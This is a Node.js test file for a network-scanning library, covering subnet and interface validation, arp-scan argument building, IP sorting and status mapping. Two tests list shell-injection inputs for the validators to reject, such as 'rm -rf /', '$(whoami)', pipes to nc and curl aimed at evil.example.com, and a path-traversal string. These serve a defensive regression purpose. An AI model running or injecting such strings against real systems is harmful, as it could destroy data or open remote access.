// ============================================================
//  lib/net.js — subnet validation, sorting, status vocabulary
// ============================================================

'use strict';

const test = require('node:test');
const assert = require('node:assert');

const {
  normaliseSubnetToCidr, isValidInterface, buildArpScanArgs, buildDiscoveryScanArgs,
  ipSortKey, sortEntriesByIp, findEntryIndex, haPingStatus, decorateEntry,
} = require('../lib/net');

test('normaliseSubnetToCidr expands shorthand networks', () => {
  assert.equal(normaliseSubnetToCidr('192.168'),       '192.168.0.0/16');
  assert.equal(normaliseSubnetToCidr('192.168.1'),     '192.168.1.0/24');
  assert.equal(normaliseSubnetToCidr('10.0.0.0/8'),    '10.0.0.0/8');
  assert.equal(normaliseSubnetToCidr('172.16.5.0/24'), '172.16.5.0/24');
  assert.equal(normaliseSubnetToCidr('192.168.0.5'),   '192.168.0.5/24');
});

test('normaliseSubnetToCidr trims surrounding whitespace', () => {
  assert.equal(normaliseSubnetToCidr('  192.168.1  '), '192.168.1.0/24');
});

// This is the guard that stopped a shell-injection path in v2.4.0. If it ever
// regresses, a crafted subnet reaches arp-scan.
test('normaliseSubnetToCidr rejects anything that is not a plain network', () => {
  const attempts = [
    '192.168.1; rm -rf /',
    '$(whoami)',
    '`id`',
    '192.168.1.0/24 && curl evil.example.com',
    '192.168.1|nc evil.example.com 1234',
    '192.168.1\n192.168.2',
    '999.1.1.1',            // octet out of range
    '192.168.1.0/99',       // prefix out of range
    '192.168.1.0/7',        // prefix below the allowed minimum
    '../../etc/passwd',
    '192.168.1.0/',
    'localhost',
    '',
    null,
    undefined,
  ];
  for (const value of attempts) {
    assert.equal(normaliseSubnetToCidr(value), null, `should reject ${JSON.stringify(value)}`);
  }
});

test('isValidInterface accepts real device names and rejects the rest', () => {
  for (const good of ['eth0', 'ens18', 'br-lan', 'vmbr0', 'wlp2s0', 'eth0.100', 'eth0:1']) {
    assert.ok(isValidInterface(good), `should accept ${good}`);
  }
  for (const bad of ['eth0; rm -rf /', 'eth0 && id', '', 'a'.repeat(33), 'eth0|nc', '$(id)']) {
    assert.ok(!isValidInterface(bad), `should reject ${JSON.stringify(bad)}`);
  }
});

test('buildArpScanArgs produces an argument array, never a shell string', () => {
  assert.deepEqual(buildArpScanArgs('192.168.1'), ['192.168.1.0/24']);
  assert.deepEqual(buildArpScanArgs('192.168.1', 'eth0'), ['-I', 'eth0', '192.168.1.0/24']);
  // Invalid input must produce null so the caller can return 400 rather than scan.
  assert.equal(buildArpScanArgs('192.168.1; id'), null);
  assert.equal(buildArpScanArgs('192.168.1', 'eth0; id'), null);
});

test('buildDiscoveryScanArgs includes bandwidth only when it is a positive integer', () => {
  assert.deepEqual(buildDiscoveryScanArgs('192.168.1', '', 1000),
    ['--bandwidth=1000K', '--quiet', '192.168.1.0/24']);
  assert.deepEqual(buildDiscoveryScanArgs('192.168.1', '', 0),
    ['--quiet', '192.168.1.0/24']);
  assert.deepEqual(buildDiscoveryScanArgs('192.168.1', '', 'abc'),
    ['--quiet', '192.168.1.0/24']);
  assert.equal(buildDiscoveryScanArgs('bad subnet', '', 100), null);
});

test('ipSortKey orders across all four octets, not just the last', () => {
  const ips = ['192.168.0.10', '192.168.0.2', '10.0.0.1', '192.168.1.1', '172.16.5.99'];
  const sorted = [...ips].sort((a, b) => ipSortKey(a) - ipSortKey(b));
  assert.deepEqual(sorted, ['10.0.0.1', '172.16.5.99', '192.168.0.2', '192.168.0.10', '192.168.1.1']);
});

test('sortEntriesByIp sorts entry objects and 192.168.0.9 precedes 192.168.0.10', () => {
  const entries = [{ ip: '192.168.0.10' }, { ip: '192.168.0.9' }, { ip: '192.168.0.100' }];
  assert.deepEqual(sortEntriesByIp(entries).map(e => e.ip),
    ['192.168.0.9', '192.168.0.10', '192.168.0.100']);
});

test('findEntryIndex locates by exact IP and returns -1 when absent', () => {
  const data = [{ ip: '10.0.0.1' }, { ip: '10.0.0.2' }];
  assert.equal(findEntryIndex(data, '10.0.0.2'), 1);
  assert.equal(findEntryIndex(data, '10.0.0.3'), -1);
});

// The v2.0.2 bug: the ping cache stores up/down, the HA endpoints compared
// against alive/unreachable, so every device reported "unknown" for months.
test('haPingStatus accepts both vocabularies', () => {
  assert.equal(haPingStatus('up'), 'online');
  assert.equal(haPingStatus('alive'), 'online');
  assert.equal(haPingStatus('down'), 'offline');
  assert.equal(haPingStatus('unreachable'), 'offline');
  for (const unknown of [undefined, null, '', 'pending', 0]) {
    assert.equal(haPingStatus(unknown), 'unknown');
  }
});

test('decorateEntry derives label with the documented fallback chain', () => {
  assert.equal(decorateEntry({ ip: '10.0.0.1', assetName: 'NAS', hostname: 'nas.lan' }).label, 'NAS');
  assert.equal(decorateEntry({ ip: '10.0.0.1', hostname: 'nas.lan' }).label, 'nas.lan');
  assert.equal(decorateEntry({ ip: '10.0.0.1' }).label, '10.0.0.1');
});

test('decorateEntry composes serviceUrl and omits default ports', () => {
  assert.equal(
    decorateEntry({ ip: '10.0.0.1', hostname: 'nas.lan', healthScheme: 'https', healthPort: '443', healthPath: '/health' }).serviceUrl,
    'https://nas.lan/health');
  assert.equal(
    decorateEntry({ ip: '10.0.0.1', hostname: 'nas.lan', healthScheme: 'http', healthPort: '80' }).serviceUrl,
    'http://nas.lan');
  assert.equal(
    decorateEntry({ ip: '10.0.0.1', healthScheme: 'https', healthPort: '8006' }).serviceUrl,
    'https://10.0.0.1:8006');
  // No health port means there is no service URL to compose.
  assert.equal(decorateEntry({ ip: '10.0.0.1' }).serviceUrl, null);
});

test('decorateEntry never mutates the entry it is given', () => {
  const original = { ip: '10.0.0.1', assetName: 'NAS' };
  const copy = { ...original };
  decorateEntry(original);
  assert.deepEqual(original, copy, 'stored data must not gain derived fields');
});
